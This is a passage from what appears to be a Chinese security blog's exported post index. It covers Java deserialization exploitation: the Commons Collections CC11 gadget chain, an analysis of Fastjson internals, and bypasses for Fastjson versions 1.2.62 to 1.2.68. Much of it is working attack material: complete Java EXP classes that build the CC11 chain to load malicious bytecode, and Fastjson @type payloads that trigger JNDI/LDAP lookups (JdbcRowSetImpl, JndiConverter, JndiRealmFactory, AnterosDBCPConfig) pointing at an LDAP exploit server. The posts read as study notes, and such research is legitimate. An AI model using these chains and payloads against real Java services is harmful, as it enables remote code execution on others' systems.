byte[][] codes = &#123;evil&#125;;  \n bytecodesField.set(templates,codes);  \n  \n Field tfactoryField = templatesClass.getDeclaredField(\"_tfactory\");  \n tfactoryField.setAccessible(true);  \n tfactoryField.set(templates, new TransformerFactoryImpl());  \n //    templates.newTransformer();  \n Transformer[] transformers = new Transformer[]&#123;  \n                new ConstantTransformer(templates),  \n new InvokerTransformer(\"newTransformer\", null, null)  \n        &#125;;  \n ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  \n HashMap&lt;Object, Object> hashMap = new HashMap&lt;>();  \n Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);  \n TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, \"key\");  \n HashMap&lt;Object, Object> expMap = new HashMap&lt;>();  \n expMap.put(tiedMapEntry, \"value\");  \n &#125;  \n&#125;\n\n\n这里在 42 行，也就是 HashMap&lt;Object, Object&gt; expMap = new HashMap&lt;&gt;(); 这里打断点，会发现直接 41 行就弹计算器了，不要着急，这里是一个 IDEA 的小坑，后续会讲。\n\nOK 言归正传，在构造最终 EXP 之前我们分析一波 ~\n\nHashMap 类的 put() 方法自动调用了 hashCode() 方法，我们尝试构造 EXP，结果中居然出现了一个很神奇的现象？！\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  \nimport org.apache.commons.collections.Transformer;  \nimport org.apache.commons.collections.functors.ChainedTransformer;  \nimport org.apache.commons.collections.functors.ConstantTransformer;  \nimport org.apache.commons.collections.functors.InvokerTransformer;  \nimport org.apache.commons.collections.keyvalue.TiedMapEntry;  \nimport org.apache.commons.collections.map.LazyMap;  \n  \nimport java.io.*;  \nimport java.lang.reflect.Field;  \nimport java.nio.file.Files;  \nimport java.nio.file.Paths;  \nimport java.util.HashMap;  \nimport java.util.Map;  \n  \npublic class CC11FinalEXP &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl templates = new com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl();  \n Class templatesClass = templates.getClass();  \n Field nameField = templatesClass.getDeclaredField(\"_name\");  \n nameField.setAccessible(true);  \n nameField.set(templates,\"Drunkbaby\");  \n  \n Field bytecodesField = templatesClass.getDeclaredField(\"_bytecodes\");  \n bytecodesField.setAccessible(true);  \n byte[] evil = Files.readAllBytes(Paths.get(\"E://Calc.class\"));  \n byte[][] codes = &#123;evil&#125;;  \n bytecodesField.set(templates,codes);  \n  \n Field tfactoryField = templatesClass.getDeclaredField(\"_tfactory\");  \n tfactoryField.setAccessible(true);  \n tfactoryField.set(templates, new TransformerFactoryImpl());  \n Transformer[] transformers = new Transformer[]&#123;  \n                new ConstantTransformer(templates),  \n new InvokerTransformer(\"newTransformer\", null, null)  \n        &#125;;  \n ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  \n HashMap&lt;Object, Object> hashMap = new HashMap&lt;>();  \n Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);  \n TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, \"key\");  \n HashMap&lt;Object, Object> expMap = new HashMap&lt;>();  \n expMap.put(tiedMapEntry, \"value\");  \n serialize(expMap);  \n unserialize(\"ser.bin\");  \n &#125;  \n    public static void serialize(Object obj) throws IOException &#123;  \n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));  \n oos.writeObject(obj);  \n &#125;  \n    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;  \n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  \n Object obj = ois.readObject();  \n return obj;  \n &#125;  \n&#125;\n\n我在打断点调试的时候发现当我序列化的时候，就能够弹出计算器，太奇怪了，其实这与 URLDNS 链中的情景其实是一模一样的。\n4. 解决在序列化的时候就弹出计算器的问题\n参考 URLDNS 链中的思想，先在执行 put() 方法的时候，先不让其进行命令执行，在反序列化的时候再命令执行。\n\n此处强烈建议师傅们去打断点好好理解一下！\n我在打完断点后分析出来的原因是这样的：\n与 URLDNS 中的不同，有些链子可以通过设置参数修改，有些则不行。在我们 CC6 的链子当中，通过修改这一句语句 Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);，可以达到我们需要的效果。\n我们之前传进去的参数是 chainedTransformer，我们在序列化的时候传进去一个没用的东西，再在反序列化的时候通过反射，将其修改回 chainedTransformer。相关的属性值在 LazyMap 当中为 factory\n\n\n\n修改如下\n\nMap lazyMap = LazyMap.decorate(hashMap, chainedTransformer);\nTiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, \"key\");\n\n-----------------> 变成\n\nMap lazyMap = LazyMap.decorate(hashMap, new ConstantTransformer(\"five\"));\nlazyMap.remove(\"key\");\n\n\n在执行 put 方法之后通过反射修改 Transformer 的 factory 值\n\n// 某伪代码块\nClass&lt;LazyMap> lazyMapClass = LazyMap.class;  \nField factoryField = lazyMapClass.getDeclaredField(\"factory\");  \nfactoryField.setAccessible(true);  \nfactoryField.set(lazyMapClass, chainedTransformer);\n\n最终成功的 EXP 如下\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  \nimport org.apache.commons.collections.Transformer;  \nimport org.apache.commons.collections.functors.ChainedTransformer;  \nimport org.apache.commons.collections.functors.ConstantTransformer;  \nimport org.apache.commons.collections.functors.InvokerTransformer;  \nimport org.apache.commons.collections.keyvalue.TiedMapEntry;  \nimport org.apache.commons.collections.map.LazyMap;  \n  \nimport java.io.*;  \nimport java.lang.reflect.Field;  \nimport java.nio.file.Files;  \nimport java.nio.file.Paths;  \nimport java.util.HashMap;  \nimport java.util.Map;  \n  \npublic class CC11FinalEXP &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl templates = new com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl();  \n Class templatesClass = templates.getClass();  \n Field nameField = templatesClass.getDeclaredField(\"_name\");  \n nameField.setAccessible(true);  \n nameField.set(templates,\"Drunkbaby\");  \n  \n Field bytecodesField = templatesClass.getDeclaredField(\"_bytecodes\");  \n bytecodesField.setAccessible(true);  \n byte[] evil = Files.readAllBytes(Paths.get(\"E://Calc.class\"));  \n byte[][] codes = &#123;evil&#125;;  \n bytecodesField.set(templates,codes);  \n  \n Field tfactoryField = templatesClass.getDeclaredField(\"_tfactory\");  \n tfactoryField.setAccessible(true);  \n tfactoryField.set(templates, new TransformerFactoryImpl());  \n Transformer[] transformers = new Transformer[]&#123;  \n                new ConstantTransformer(templates),  \n new InvokerTransformer(\"newTransformer\", null, null)  \n        &#125;;  \n ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  \n HashMap&lt;Object, Object> hashMap = new HashMap&lt;>();  \n//        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);  \n Map lazyMap = LazyMap.decorate(hashMap, new ConstantTransformer(\"five\")); // 防止在反序列化前弹计算器  \n TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, \"key\");  \n HashMap&lt;Object, Object> expMap = new HashMap&lt;>();  \n expMap.put(tiedMapEntry, \"value\");  \n lazyMap.remove(\"key\");  \n  \n // 在 put 之后通过反射修改值  \n Class&lt;LazyMap> lazyMapClass = LazyMap.class;  \n Field factoryField = lazyMapClass.getDeclaredField(\"factory\");  \n factoryField.setAccessible(true);  \n factoryField.set(lazyMap, chainedTransformer);  \n  \n serialize(expMap);  \n unserialize(\"ser.bin\");  \n &#125;  \n    public static void serialize(Object obj) throws IOException &#123;  \n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));  \n oos.writeObject(obj);  \n &#125;  \n    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;  \n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  \n Object obj = ois.readObject();  \n return obj;  \n &#125;  \n&#125;\n\n\n\n5. 最终不带 Transformer 数组的 CC11 链子前面我们说的链子，还是调用了 Transformer 数组的，但是真正的 CC11 链子是可以不带Transformer 数组的，这样，我们可以通过 CC11 来打 Shiro-550 的漏洞。\n\n本质原因如下\n\n这个 LazyMap#get 的参数 key，会被传进transform()，实际上它可以扮演  ConstantTransformer 的角色——一个简单的对象传递者。\n我们 LazyMap.get(key) 直接调用 InvokerTransfomer.transform(key)，然后像CC2那样调用 TempalteImpl.newTransformer() 来完成后续调用。\n我们将原本的 Transformer 数组那一行修改如下\nInvokerTransformer invokerTransformer = new InvokerTransformer&lt;>(\"newTransformer\", new Class[]&#123;&#125;, new Object[]&#123;&#125;);\n\n再将后面几行的代码修改如下\nMap hashMap = new HashMap();\nMap lazyMap = LazyMap.decorate(hashMap, new ConstantTransformer(1));\nTiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, templates);\n \nMap expMap = new HashMap();\nexpMap.put(tiedMapEntry, \"valuevalue\");\nlazyMap.remove(templates);\n\n得到的最终 EXP 如下\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  \nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  \nimport org.apache.commons.collections.Transformer;  \nimport org.apache.commons.collections.functors.ChainedTransformer;  \nimport org.apache.commons.collections.functors.ConstantTransformer;  \nimport org.apache.commons.collections.functors.InvokerTransformer;  \nimport org.apache.commons.collections.keyvalue.TiedMapEntry;  \nimport org.apache.commons.collections.map.LazyMap;  \n  \nimport java.io.*;  \nimport java.lang.reflect.Field;  \nimport java.nio.file.Files;  \nimport java.nio.file.Paths;  \nimport java.util.HashMap;  \nimport java.util.Map;  \n  \n// 改进版 CC11 EXPpublic class CC11BestEXP &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        byte[] code = Files.readAllBytes(Paths.get(\"E:\\\\JavaClass\\\\TemplatesBytes.class\"));  \n TemplatesImpl templates = new TemplatesImpl();  \n setFieldValue(templates, \"_name\", \"Calc\");  \n setFieldValue(templates, \"_bytecodes\", new byte[][] &#123;code&#125;);  \n setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl());  \n InvokerTransformer invokerTransformer = new InvokerTransformer(\"newTransformer\", new Class[]&#123;&#125;, new Object[]&#123;&#125;);  \n//        ChainedTransformer chainedTransformer = new ChainedTransformer(invokerTransformer);  \n HashMap&lt;Object, Object> hashMap = new HashMap&lt;>();  \n//        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);  \n Map lazyMap = LazyMap.decorate(hashMap, new ConstantTransformer(\"five\")); // 防止在反序列化前弹计算器  \n TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, templates);  \n HashMap&lt;Object, Object> expMap = new HashMap&lt;>();  \n expMap.put(tiedMapEntry, \"value\");  \n lazyMap.remove(templates);  \n  \n // 在 put 之后通过反射修改值  \n setFieldValue(lazyMap, \"factory\", invokerTransformer);  \n  \n serialize(expMap);  \n unserialize(\"ser.bin\");  \n &#125;  \n  \n    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;  \n        Field field = obj.getClass().getDeclaredField(fieldName);  \n field.setAccessible(true);  \n field.set(obj, value);  \n &#125;  \n  \n    public static void serialize(Object obj) throws IOException &#123;  \n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));  \n oos.writeObject(obj);  \n &#125;  \n    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;  \n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  \n Object obj = ois.readObject();  \n return obj;  \n &#125;  \n&#125;\n\n0x06 小结作为 yso 官方当中并没有的链子，CC11 链同时也被叫做是 CC2 + CC6 链的结合体，我这里把它单独拉出来，主要是为了后续 Shiro 学习，以及很多其他反序列化的学习当中，可以将 CC11 链单独作为一个非常好用的链子来攻击。\ncc11 好用的原因主要是 能够像 cc2 一样加载恶意字节码，同时受影响的版本还是 CommonsCollections 3.1-3.2.1 这个版本相对 CommonsCollections 4.0 范围应该会更广一些。\n0x07 参考资料http://wjlshare.com/archives/1536https://johnfrod.top/%e5%ae%89%e5%85%a8/monscollections3%e5%88%a9%e7%94%a8%e9%93%be%e5%88%86%e6%9e%90/\n","categories":["Java"],"tags":["Java"]},{"title":"Java反序列化Fastjson篇05-写给自己看的一些源码深入分析","url":"/2022/10/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8705-%E5%86%99%E7%BB%99%E8%87%AA%E5%B7%B1%E7%9C%8B%E7%9A%84%E4%B8%80%E4%BA%9B%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/","content":"写给自己看的 Fastjson 源码深入分析\n\nJava 反序列化 Fastjson 篇 05-写给自己看的一些源码深入分析0x01 前言写这篇文章的目的是在学习 SnakeYaml 的时候发现自己的 Fastjson 功底并不牢固，很多地方只是学习了其他师傅的文章，而自己并未进行源码阅读，想起来也是非常惭愧……趁着这个机会自己好好过一遍。\n0x02 Fastjson 原理浅析Fastjson反序列化采用两个反序列化的方法，它们分别是  \nJSON.parseObject()JSON.parse()\nparseObject：返回 fastjson.JSONObject 类\nparse ：返回我们的类 User\n可以发现在都是默认输入的情况下，parseObject 会返回 parseObject，parse 则会返回我们的 Student 类\n\n\n但是我们可以通过在 parseObject 参数中传入类，从而达到和 parse 相同的效果\nparseObject(input,Object.class) （这里同样可以传入 Student.class）, 发现此时也变成了 Student 类\n\n\n这里我们深入看一下 JSON 类里面的 parseObject 和 parse 方法\n\n\n\n可以看到此处，parse 方法和 parseObject 方法被重写了很多，我们挑一些使用到的方法看一看。因为参数都是大同小异。\n\nparse 方法解析public static Object parse(String text, Feature... features) &#123;  \n    int featureValues = DEFAULT_PARSER_FEATURE;  \n    for (Feature feature : features) &#123;  \n        featureValues = Feature.config(featureValues, feature, true);  \n    &#125;  \n  \n    return parse(text, featureValues);  \n&#125;\n\n传入两个参数，一个是 String text，这是我们要拿去反序列化解析的字符串。另外一个参数是 Feature，Feature 并没有什么特别大的用处，如果没有选择该 Feature，那么在反序列的过程中，FastJson 会自动把下划线命名的 Json 字符串转化到驼峰式命名的 Java 对象字段中。\n在自己调试打断点的过程当中，发现 DefaultJSONParser#parseObject 里面有一个 TypeUtils.loadClass()，一直想不起来在哪条链子里面见到过，如果有见到过的师傅请提醒一下我；总感觉这里有点攻击隐患的味道在。\n\n\n\n这里我自己调试了一遍代码，发现有的东西和   Mi1k7ea 师傅讲的似乎有些许区别。\n\n我在调试的时候发现 parse() 方法的反序列化实际上也是去到了 DefaultJSONParser#parseObject 里面。而 Mi1k7ea 师傅的意思是，调用 parseObject() 方法的时候实际上是调用了 parse() 方法，其实明显不是这样。两者都会走到 DefaultJSONParser#parseObject\nparseObject 方法解析\n比较重要的是第二个参数，也就是要求我们传入 Object.class，或者说，对于很多开发者，为了省事儿，会在第二个参数传入 Object.class\n\n具体的就不再赘述了，在实际开发场景当中 parseObject() 用到的非常多，基本全部都是。下面我们详细看一看为什么 Fastjson 在反序列化的时候会自动调用 getter&#x2F;setter，同时也再给自己过一遍 Fastjson 反序列化的流程。\n为什么 Fastjson 在反序列化的时候会自动调用 getter&#x2F;setter断点下在 DefaultJSONParser#parseObject 下，因为前面的过程都是在互相调用，可以直接看这里的业务层。\n开始调试，走到第 639 行这里，跟进一下 derializer.deserialze()，deserialze() 方法做的业务比较特殊：如果传进来要解析的类是 Array 数组类，就直接进行 newInstance() 的实例化，并且将数组数据返回。\n如果传进来的不是 Array 数组类，而是 Object 类，或是不可以反序列化的类，就会走到下一个业务方法的 parseObject() 里面。\n\n\n继续往下跟，会走到新的 DefaultJSONParser#parseObject 下\n\n\n这一个 DefaultJSONParser#parseObject 的业务流程是先做了一个基础的判断，判断是去判断 token 是否相同，关于 Fastjson Token 可以看这篇文章，因为这位师傅讲的非常清晰，我这里就不做自我总结了，这个东西看懂就可以。\nhttps://blog.csdn.net/qq_45854465/article/details/120626835\n继续往下，在 322 行这里的 TypeUtils.loadClass() 可以提一嘴，我之前一直觉得这个地方是有攻击潜力的，包括在下面也看到了 clazz.newInstance() 的代码，一度以为可以打。并且此处的config.getDefaultClassLoader() 我觉得是可控的，在问了 Y4tacker 爷之后，Y4 师傅说这里是没用的，因为只是实例化了一个类。\n后续我找到了为啥看这个地方很眼熟，是因为 Fastjson 1.2.25 版本当中，把 TypeUtils.loadClass() 换成了 checkAutoType()，而 TypeUtils.loadClass() 的代码中是有逻辑问题的，因此可以造成些许绕过。\n还有的是 1.2.47 的那个通杀 EXP，在 1.2.48 版本之前的 EXP 都是能够通过 TypeUtils.loadClass() 来绕过的，因为它能会把第一次 @type 的结果缓存到 Map 当中。\n重新回到代码里面，DefaultJSONParser 类的 367 行，把 deserializer 的值拿出来，赋给 ObjectDeserializer deserializer，跟进一下\n\n\n跟过来是一个方法，继续往下跟进具体的业务方法\n\n\n前面都是做了很多数据处理，到第 461 行这里，跟进。\n\n\n继续往下走，终于才能看到我们的主角登场了  JavaBeanInfo#build\n\n\nJavaBeanInfo#buildJavaBeanInfo#build 先通过反射获取我们 @type 里面要去反序列化的那个类的一些基本信息。\n继续往下走，里面有一个 for 循环，当中把 @type 类对应的 Methods 全部拿出来。\n\n\n首先会遍历 methods 中所有的 method 方法，然后会经过四个判断，只要符合任意一个判断就会触发 continue 跳出当前循环，所以必须要满足下面列出来的五个方法才能顺利执行，否则就会跳出当前循环（ps：这里和代码中的判断要反一反）\n\n方法名长度不能小于4\n不能是静态方法\n返回的类型必须是void 或者是自己本身\n传入参数个数必须为1\n方法开头必须是set\n\n\n\n最后将可用的 setter 方法放到 fieldList 里面，如图\n\n\n此时，在 fieldList 当中，我们有三个 FieldInfo，这也就是我们的三个 setter 方法。\n下面我们来看 getter 方法是如何被获取到的，其实是大同小异。首先会遍历 methods 中的每个方法，同样的如果要顺利执行下去需要符合四个条件\n\n方法名长度不小于4\n不能是静态方法\n方法名要 get 开头同时第四个字符串要大写\n方法返回的类型必须继承自 Collection Map AtomicBoolean AtomicInteger AtomicLong\n传入的参数个数需要为 0\n\n\n\n同样的如果符合上面要求的就会添加到 FieldInfo 中，在我 Student 类里面，只有 gqetProperties 方法符合预期，所以只获取到了 getProperties 方法\n\n\n最后返回 JavaBeanInfo，beanInfo 中会存放我们类中的各种信息\n\n\n后续，在 JavaBeanDeserializer#deserialze 方法中，对 FieldInfo 进行循环遍历，将每一个可用的 setter 与 getter 方法拿出来，具体的触发流程是这样的：\n第 593 行，fieldDeser.setValue(object, fieldValue);，跟进之后是反射调用方法的语句\n\n\n\n至此，分析过程全部结束\n\n0x03 Fastjson 其他点解析(持续补充)关于 Feature.SupportNonPublicField由于该字段在fastjson1.2.22版本引入，所以只能影响1.2.22-1.2.24\n在前面的Evil类中，可以发现我们的setter和getter方法是public的，但是如果有时候遇到private的情况我们就不能进行反序列化了，会返回 null\n这时我们可以添加SerializerFeature.WriteClassName 参数，这样私有属性 _bytecodes ，_tfactory就会被fastjson正常反序列化了\n关于 checkAutoType\n这其实是从 Fastjson 1.2.24 版本之后出来的修复点。\n\ncheckAutoType() 函数就是使用黑白名单的方式对反序列化的类型继续过滤，acceptList 为白名单（默认为空，可手动添加），denyList 为黑名单（默认不为空）。\n默认情况下，autoTypeSupport 为 False，即先进行黑名单过滤，遍历 denyList，如果引入的库以 denyList 中某个 deny 开头，就会抛出异常，中断运行。\ntrue: 先白名单过滤，匹配成功即可加载该类，否则再黑名单过滤false: 先黑名单过滤，再白名单过滤，若白名单匹配上则直接加载该类，否则报错\n0x04 Fastjson 多 @type 的通杀型 EXP 调试起因还是因为 SnakeYaml 学习过程中发现的这个问题，当时只是跟着 Mi1k7ea 师傅过了一遍，并未进行分析，有点后悔，现在自己再重新回来复习一遍。\nEXP\nimport com.alibaba.fastjson.JSON;\n \npublic class JdbcRowSetImplPoc &#123;\n    public static void main(String[] argv)&#123;\n        String payload  = \"&#123;\\\"a\\\":&#123;\\\"@type\\\":\\\"java.lang.Class\\\",\\\"val\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\"&#125;,\"\n                + \"\\\"b\\\":&#123;\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\"\n                + \"\\\"dataSourceName\\\":\\\"ldap://localhost:1389/Exploit\\\",\\\"autoCommit\\\":true&#125;&#125;\";\n        JSON.parse(payload);\n    &#125;\n&#125;\n\n开始调试，用的 Fastjson 版本是 1.2.47 的；\n简单说一下原理，具体的可以看 Java反序列化Fastjson篇03-Fastjson各版本绕过分析\n在运行完毕后会返回一个 obj，这个 obj 里面是类名以及其对应的属性值，这个属性值会保存到 map 里面，如图\n\n\n这个 map 放了原本的值，也就是我们说的缓存，可以通过 TypeUtils.getClassFromMapping() 来加载，太妙了，太妙了。我之前看 snakeYaml 也有类似的 map，但是并未进行操作，到时候可以看一看。\n","categories":["Java"],"tags":["Java"]},{"title":"Java反序列化Fastjson篇04-Fastjson1.2.62-1.2.68版本反序列化漏洞","url":"/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","content":"Fastjson1.2.62-1.2.68版本反序列化漏洞\n\nJava 反序列化 Fastjson 篇 04-Fastjson 1.2.62-1.2.68 版本反序列化漏洞0x01 前言复现 Mi1k7ea 师傅的文章：Fastjson系列六——1.2.48-1.2.68反序列化漏洞\n学习一下 Fastjson 1.2.62-1.2.68 版本反序列化的漏洞，主要思路的话还是基于黑名单的绕过，然后构造出可行的 EXP 来攻击。\n0x02 1.2.62 反序列化漏洞前提条件\n需要开启AutoType；\nFastjson &lt;&#x3D; 1.2.62；\nJNDI注入利用所受的JDK版本限制；\n目标服务端需要存在xbean-reflect包；xbean-reflect 包的版本不限，我这里把 pom.xml 贴出来。\n\npom.xml\n&lt;dependencies>\n\n&lt;dependency>  \n &lt;groupId>com.alibaba&lt;/groupId>  \n &lt;artifactId>fastjson&lt;/artifactId>  \n &lt;version>1.2.62&lt;/version>  \n&lt;/dependency>  \n&lt;dependency>  \n &lt;groupId>org.apache.xbean&lt;/groupId>  \n &lt;artifactId>xbean-reflect&lt;/artifactId>  \n &lt;version>4.18&lt;/version>  \n&lt;/dependency>  \n&lt;dependency>  \n &lt;groupId>commons-collections&lt;/groupId>  \n &lt;artifactId>commons-collections&lt;/artifactId>  \n &lt;version>3.2.1&lt;/version>  \n&lt;/dependency>\n&lt;/dependencies>\n\n漏洞原理与 EXP新 Gadget 绕过黑名单限制。\norg.apache.xbean.propertyeditor.JneeeeediConverter 类的 toObjectImpl() 函数存在 JNDI 注入漏洞，可由其构造函数处触发利用。\n我们这里可以去到 JndiConverter 这个类里面，看到 toObjectImpl() 方法确实是存在 JNDI 漏洞的。\n\n\n\n但是这个 toObjectImpl() 方法并不是 getter&#x2F;setter 方法，也不是构造函数，我不太明白为什么会被调用，后面问了一下 Johnford 师傅，更明确了 Fastjson 漏洞利用的方式。\n\n因为我们对 JndiConverter 这个类进行反序列化的时候，会自动调用它的构造函数，而它的构造函数里面调用了它的父类。所以我们反序列化的时候不仅能够调用 JndiConverter 这个类，还会去调用它的父类 AbstractConverter\n然后在父类 AbstractConverter 中，呃，这里咋说呢；我最早是去找谁调用了 JndiConverter#toObjectImpl()，就找到了 AbstractConverter#setAsText()；也就是这里不是单纯的逆向思维，而是正向和逆向思维一起作用的。\n\n\n所以这里我们的 payload 可以设置成这样\n\"&#123;\n\n\\\"@type\\\":\\\"org.apache.xbean.propertyeditor.JndiConverter\\\", \n\\\"AsText\\\":\\\"ldap://127.0.0.1:1234/ExportObject\\\"\n\n&#125;\"\n\nEXP 如下\nimport com.alibaba.fastjson.JSON;  \nimport com.alibaba.fastjson.parser.ParserConfig;  \nimport org.apache.xbean.propertyeditor.JndiConverter;  \n  \npublic class EXP_1262 &#123;  \n    public static void main(String[] args) &#123;  \n        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  \n String poc = \"&#123;\\\"@type\\\":\\\"org.apache.xbean.propertyeditor.JndiConverter\\\",\" +  \n                \"\\\"AsText\\\":\\\"ldap://127.0.0.1:1234/ExportObject\\\"&#125;\";  \n JSON.parse(poc);  \n &#125;  \n&#125;\n\n\n\n调试分析\n我这里只分析开启 autoType 的，如果未开启 AutoType、未设置 expectClass 且类名不在内部白名单中，是不能恶意加载字节码的。\n\n直接在 CheckAutoType() 函数上打上断点开始分析，函数位置：com\\alibaba\\fastjson\\parser\\ParserConfig.java\n相比于之前版本调试分析时看的 CheckAutoType() 函数，这里新增了一些代码逻辑，这里大致说下，下面代码是判断是否调用 AutoType 相关逻辑之前的代码，说明如注释：\nif (typeName == null) &#123;\n          return null;\n      &#125;\n \n// 限制了JSON中@type指定的类名长度\n      if (typeName.length() >= 192 || typeName.length() &lt; 3) &#123;\n          throw new JSONException(\"autoType is not support. \" + typeName);\n      &#125;\n \n// 单独对expectClass参数进行判断，设置expectClassFlag的值\n// 当且仅当expectClass参数不为空且不为Object、Serializable、...等类类型时expectClassFlag才为true\n      final boolean expectClassFlag;\n      if (expectClass == null) &#123;\n          expectClassFlag = false;\n      &#125; else &#123;\n          if (expectClass == Object.class\n                  || expectClass == Serializable.class\n                  || expectClass == Cloneable.class\n                  || expectClass == Closeable.class\n                  || expectClass == EventListener.class\n                  || expectClass == Iterable.class\n                  || expectClass == Collection.class\n                  ) &#123;\n              expectClassFlag = false;\n          &#125; else &#123;\n              expectClassFlag = true;\n          &#125;\n      &#125;\n \n      String className = typeName.replace('$', '.');\n      Class&lt;?> clazz = null;\n \n      final long BASIC = 0xcbf29ce484222325L;\n      final long PRIME = 0x100000001b3L;\n \n// 1.2.43检测，\"[\"\n      final long h1 = (BASIC ^ className.charAt(0)) * PRIME;\n      if (h1 == 0xaf64164c86024f1aL) &#123; // [\n          throw new JSONException(\"autoType is not support. \" + typeName);\n      &#125;\n \n// 1.2.41检测，\"Lxx;\"\n      if ((h1 ^ className.charAt(className.length() - 1)) * PRIME == 0x9198507b5af98f0L) &#123;\n          throw new JSONException(\"autoType is not support. \" + typeName);\n      &#125;\n \n// 1.2.42检测，\"LL\"\n      final long h3 = (((((BASIC ^ className.charAt(0))\n              * PRIME)\n              ^ className.charAt(1))\n              * PRIME)\n              ^ className.charAt(2))\n              * PRIME;\n \n// 对类名进行Hash计算并查找该值是否在INTERNAL_WHITELIST_HASHCODES即内部白名单中，若在则internalWhite为true\n      boolean internalWhite = Arrays.binarySearch(INTERNAL_WHITELIST_HASHCODES,\n              TypeUtils.fnv1a_64(className)\n      ) >= 0;\n\n\n\n断点位置如图，开始调试。\n\n\n\n和前面一样的，看看关键点。\n这里是进入了第一个判断的代码逻辑即开启AutoType的检测逻辑，先进行哈希白名单匹配、然后进行哈希黑名单过滤，但由于该类不在黑白名单中所以这块检测通过了并往下执行：\n\n\n往下执行，到未开启AutoType的检测逻辑时直接跳过再往下执行，由于AutoTypeSupport为true，进入调用loadClass()函数的逻辑来加载恶意类：\n\n\n就简单来说，和之前的没什么区别，后续就不再分析了。\n补丁分析黑名单绕过的Gadget补丁都是在新版本中添加新Gadget黑名单来进行防御的：https://github.com/alibaba/fastjson/compare/1.2.62%E2%80%A61.2.66#diff-f140f6d9ec704eccb9f4068af9d536981a644f7d2a6e06a1c50ab5ee078ef6b4\n新版本运行后直接被抛出异常：\nException in thread \"main\" com.alibaba.fastjson.JSONException: autoType is not support. org.apache.xbe\n\n在哈希黑名单中添加了该类，其中匹配到了该恶意类的Hash值：\n\n\n0x03 1.2.66 反序列化漏洞前提条件\n开启AutoType；\nFastjson &lt;&#x3D; 1.2.66；\nJNDI注入利用所受的JDK版本限制；\norg.apache.shiro.jndi.JndiObjectFactory类需要shiro-core包；\nbr.com.anteros.dbcp.AnterosDBCPConfig 类需要 Anteros-Core和 Anteros-DBCP 包；\ncom.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类需要ibatis-sqlmap和jta包；\n\n漏洞原理新Gadget绕过黑名单限制。\n1.2.66涉及多条Gadget链，原理都是存在JDNI注入漏洞。\norg.apache.shiro.realm.jndi.JndiRealmFactory类PoC：\n&#123;\"@type\":\"org.apache.shiro.realm.jndi.JndiRealmFactory\", \"jndiNames\":[\"ldap://localhost:1389/Exploit\"], \"Realms\":[\"\"]&#125;\n\nbr.com.anteros.dbcp.AnterosDBCPConfig类PoC：\n&#123;\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"metricRegistry\":\"ldap://localhost:1389/Exploit\"&#125;或&#123;\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"healthCheckRegistry\":\"ldap://localhost:1389/Exploit\"&#125;\n\ncom.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类PoC：\n&#123;\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\",\"properties\": &#123;\"@type\":\"java.util.Properties\",\"UserTra\n\nEXPimport com.alibaba.fastjson.JSON;  \nimport com.alibaba.fastjson.parser.ParserConfig;  \n  \npublic class EXP_1266 &#123;  \n    public static void main(String[] args) &#123;  \n        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  \n String poc = \"&#123;\\\"@type\\\":\\\"org.apache.shiro.realm.jndi.JndiRealmFactory\\\", \\\"jndiNames\\\":[\\\"ldap://localhost:1234/ExportObject\\\"], \\\"Realms\\\":[\\\"\\\"]&#125;\";  \n//        String poc = \"&#123;\\\"@type\\\":\\\"br.com.anteros.dbcp.AnterosDBCPConfig\\\",\\\"metricRegistry\\\":\\\"ldap://localhost:1389/Exploit\\\"&#125;\";  \n//        String poc = 